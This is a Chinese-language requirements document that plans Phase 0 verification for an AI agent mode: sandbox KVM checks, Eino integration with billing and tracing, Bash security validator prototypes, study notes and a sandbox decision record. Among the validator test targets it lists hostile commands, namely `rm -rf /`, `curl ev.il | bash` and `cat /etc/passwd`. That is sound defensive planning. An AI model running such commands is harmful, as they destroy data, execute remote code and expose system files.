# Agent 模式 Phase 0 前置验证

## 来源
- 提出人：产品负责人 / 创始人
- 提出日期：2026-05-20
- 上下文：`docs/agent-mode/architecture-v1.md`（7349 行架构蓝本）已完成。Agent 模式整体分解为 14 个连续 Standard feature（蓝本 §11 Roadmap 列出 W1–W12+）。本 feature 是 **第 1/14**，定位为"动一行业务代码前的关键技术假设验证"。

## 需求描述

### 问题

`architecture-v1.md` 做了大量纸面决策（Eino 作 Runtime 基座 / Daytona 自托管沙箱 / Bash 安全管道 23 validator），但有四个关键假设**没在腾讯云生产同型机上跑过**：

1. **Daytona OSS 依赖 KVM 虚拟化**，腾讯云 dev 服务器（49.233.219.254）是否启用嵌套 KVM 不确定。如不可用，整个"自托管沙箱"路径需要换备选（Docker pool 或 CubeSandbox 提前到 v1）。
2. **Eino（cloudwego/eino）与项目自研 aiservice 入口的整合方式**没验证过 —— Eino 自带 LLM adapter，能否优雅复用 `aiservice.Chat()`（确保 Langfuse trace + billing 计费 + 路由降级三件套不丢）是未知数。
3. **Bash 安全 pipeline 的 8 个 P0 validator** 是从 Claude Code v2.1 拆解的，但具体到 Go 实现 + 在自托管沙箱内运行的拦截链路，没写过原型。
4. **Coze Studio / Eino 源码深读笔记**没沉淀，团队对 Eino Graph API 心智模型不一致，写正式 PRD 风险高。

不做 Phase 0 直接进 Phase 1 编码 = 押 4 个赌注同时下场，任一失败都要返工。

### 范围（Phase 0 只做验证，不上 prod，不进业务代码）

| # | 验证项 | 产出物 | Go/No-Go 标准 |
|---|--------|--------|--------------|
| V1 | 腾讯云 dev 服务器 KVM 可用性 + Daytona OSS Docker Compose 跑通 | `decisions/agent-mode-phase0-verification/0001-kvm-daytona.md`（含 `kvm-ok` 输出 + docker compose ps + workspace 启动截图）| Daytona workspace 能起 Python 3.11，能执行 `print("hello")` 拿到 stdout |
| V2 | Eino + aiservice 整合 demo（独立 Go 程序，**不进 internal/numind/biz**） | `cmd/agent-phase0-eino-demo/main.go` + 独立 `go.mod` + README，跑一次 ReAct loop（"今天周几" → 调时间工具 → 输出答案）| ① LLM tool-use 调用走 `aiservice.Chat()`；② Langfuse 后台可见 trace 树（含 generation + span 至少 2 个 observation）；③ Langfuse `generation.usage.total_tokens > 0`；④ 同一次调用在 `credit_reservation` / `credit_transaction` 有对应行（source_type 非 NULL），用 SQL 抽样校验 |
| V3 | 8 个 P0 Bash validator 原型 | `cmd/agent-phase0-bash-validator/`（Go 函数 + 20 个攻击向量测试）| 8 个 validator（ControlChar/Unicode/CR/CommandSub/IFS/ProcEnviron/BackslashOp/BraceExpansion）独立单元测试全 pass；20 个攻击向量（含 `rm -rf /` / `curl ev.il \| bash` / `cat /etc/passwd`）100% 拦截 |
| V4 | Coze Studio / Eino 源码深读笔记 | `docs/agent-mode/eino-coze-study-notes.md`（不少于 3000 字，含 Eino Graph API 关键代码引用 + Coze 工具加载机制摘要）| 至少回答：Eino Graph 节点之间如何传 state / Eino 工具注册接口 / Coze 是否值得借鉴架构思路 |
| V5 | 沙箱方案最终决策 ADR | `decisions/agent-mode-phase0-verification/0002-sandbox-final.md` | 基于 V1 实测结果，记录"v1 用 Daytona / Docker pool / CubeSandbox 提前"三选一的最终决策 + 理由 + 备选触发条件 |

### 不在范围（Out of Scope）

- 任何业务代码（biz / store / controller / 前端组件）—— 后 13 个 feature 处理
- agent_* 数据库表（agent_skill / agent_session / agent_memory_l1/l2 / sandbox_session / tool_invocation / credit_admin_test_grant）—— 在 `agent-mode-runtime-skeleton` (feature #2) 和 `agent-mode-billing-integration` (feature #12) 落
- `aiservice` 的任何改造 —— 后续 feature 视情况
- 部署链路 / docker-compose.yml 修改（Phase 0 demo 全部在构建机或本地跑，不进 dev container）
- 前端代码 / API 路由
- **Eino / Daytona SDK 依赖不进主 `numind-server/go.mod`**：V2/V3 demo 使用独立 `cmd/agent-phase0-*/go.mod`，避免污染主 server 依赖树和编译时间。主 server 引入 Eino 是 feature #2 (`agent-mode-runtime-skeleton`) 的范围。

### 技术约束（来自 CLAUDE.md，必须遵守）

- 不修改 `config_prod.yaml`
- 不硬编码 API 密钥（Daytona / Coze API 凭据走环境变量 + `.claude/settings.local.json`）
- 不在 controller 写业务逻辑（Phase 0 不动 controller，但 V2 demo 必须用 `aiservice.Chat()` 入口，禁止裸 HTTP 调外部 LLM）
- demo 二进制（`cmd/agent-phase0-*`）独立编译，不污染主 server build
- Phase 0 的 5 个产出物都是 docs / 一次性 demo 代码，feature 完成时**保留** demo（作回归参考），但**不进 prod 部署**

## 业务目标

1. **降低 13 个后续 feature 的返工概率**：任一前置假设失败 → Phase 0 暴露 → 重定方向，比 Phase 1 W7 才发现便宜 10 倍。
2. **建立团队 Eino 心智模型基线**：V4 深读笔记是后 13 个 feature 的共享知识库，避免每个 feature S2 阶段重读源码。
3. **沙箱方案最终落地**：V5 决策 ADR 是 `agent-mode-sandbox-integration` (feature #4) 的输入条件，不锁死决策无法进 #4。
4. **为 S5 验证策略提供模板**：V3 的 8 个 validator 测试模式（攻击向量库）会被 `agent-mode-permission-pipeline` (feature #6) 复用。

## 优先级

**高** —— 阻塞剩余 13 个 agent-mode-* feature。Phase 0 不闭环，后续都无法进 S0 Triage。

## Triage

- 推荐轨道：**Standard**
- 分类理由：
  1. 数据库 schema 变更：**否**（Phase 0 只产 docs + 隔离 demo 代码，零 DDL）
  2. 新增 API 端点：**否**（demo 不暴露 HTTP）
  3. 新外部服务集成：**是**（Daytona 自托管 + Eino 框架引入；虽然只是验证不进 prod，但首次接入需要走完 S0-S2 选型 + S3 plan + S4 编码 demo + S5 验证 + S6 决策固化）
  4. 影响文件数：**>3**（5 个产出物，每个对应 1-N 个文件）
  5. 高风险业务逻辑（支付/权限）：**否**（不动计费 / 权限 / 用户数据）

   **5 条中 1 条命中 → 已超出 Hotfix 门槛，必须走 Standard**。同时 §3、§4 决定"为何不能 Micro / Hotfix"：本 feature 需要严肃的方案对比（V5 沙箱 ADR）+ 多产出物原子性 review（V3 validator 测试 + V4 笔记 + V5 ADR 之间有相互校验关系），Hotfix 三阶段无法承载。

- 人类决定：**确认 Standard**（已在 Triage 对话中由用户确认 2026-05-20）

## S5 验证策略（来自 NDF 规则 10，S3 plan 还会再细化）

**验证方式：仅后端 TDD + 手工演示**

- V1 KVM/Daytona：手工运行 + 截图归档（一次性环境验证，无回归测试场景）
- V2 Eino demo：Go 单元测试 + 手工跑一次完整 ReAct loop + Langfuse 后台肉眼检查 trace 树
- V3 Bash validator：Go 单元测试覆盖 20 个攻击向量（**所有 validator 必须有单测，feature #6 会继承复用**）
- V4 深读笔记：reviewer 校验质量（不少于 3000 字 + 关键代码引用准确 + 回答 3 个核心问题）
- V5 ADR：reviewer 校验决策完整性（含三选一、理由、触发条件）

**理由**：Phase 0 不出业务代码 → 不需 Playwright E2E 也不需 gstack `/qa`。验证产物本身是文档 + 一次性 demo，覆盖率诉求不同于业务功能。

**回归保护诚实声明**：V1/V4/V5 是一次性产出，无回归测试。V2/V3 的 demo 单测会保留在 `cmd/agent-phase0-*` 下，作为后续 feature 的"基准实现参考"，不会进 CI 主回归套件（feature #6 的正式 validator 实现会有独立 Playwright/集成测试覆盖）。

## 备注

- **跨 feature 关系**：本 feature 完成后，`agent-mode-runtime-skeleton` (feature #2) 可立即启动，并在 S2 spec 引用本 feature 的 V2 demo 代码作为"工程化模板"。
- **架构蓝本同步**：本 feature 不修改 `docs/agent-mode/architecture-v1.md`，但 V5 沙箱决策若与蓝本 §10 决策 #5 冲突（蓝本默认选 Daytona），需在 V5 ADR 顶部注明"覆盖蓝本决策 #5"。
- **Phase 0 决策门**：V1+V2 都跑通 → Phase 0 通过，可进 feature #2；V1 失败 → 触发 V5 备选路径（Docker pool 或 CubeSandbox 提前）；V2 失败 → 触发"Eino vs 自研最小 Runtime"二次评估（不在本 feature 范围，立项 follow-up feature）。
- **时间预算**：W1–W2 共 5 工作日（不含周末），3 工作日 V1+V2+V3 并行，2 工作日 V4+V5 串行。
- **任务依赖图（S3 plan 会基于此细化）**：
  ```
  V1 ─────────────┐
                  ├──→ V5 (沙箱 ADR 依赖 V1 实测结果)
                  │
  V2 (独立)        │
  V3 (独立)        │
  V4 (独立)        │
  ```
  V1/V2/V3/V4 四项可并行；V5 必须等 V1 完成（核心决策输入是 KVM 实测结果）。S3 dispatch subagent 时 V1/V2/V3 同 turn 并行调度，V4 同步或滞后，V5 在 V1 返回后单独 dispatch。

- **跨 feature 关系（补充）**：
  - **feature #2 `agent-mode-runtime-skeleton`**：依赖 V2 demo 作为"工程化模板"，且依赖 V5 ADR（Sandbox 决策影响 Runtime 与 Sandbox 的接口边界）→ **必须等 Phase 0 完整闭环（V1+V2+V5 全过）后启动**。
  - **feature #3 `agent-mode-tool-registry`**：Tool Registry 是接口层（38 字段 Tool interface + ToolFactory 插件），**与 V1-V5 验证物均无运行时依赖**——理论上可以与 Phase 0 并行启动，但其 S2 spec 需引用 V4 深读笔记里的 Eino 工具注册机制章节，**建议 V4 完成后再启动 #3 的 S2 阶段**（S0/S1 可提前）。
  - **feature #4 `agent-mode-sandbox-integration`**：硬依赖 V5 ADR → Phase 0 闭环前禁止启动。
  - **feature #6 `agent-mode-permission-pipeline`**：继承 V3 的 8 个 P0 Bash validator 代码 + 攻击向量测试库 → V3 完成后即可启动（不必等其他验证项）。
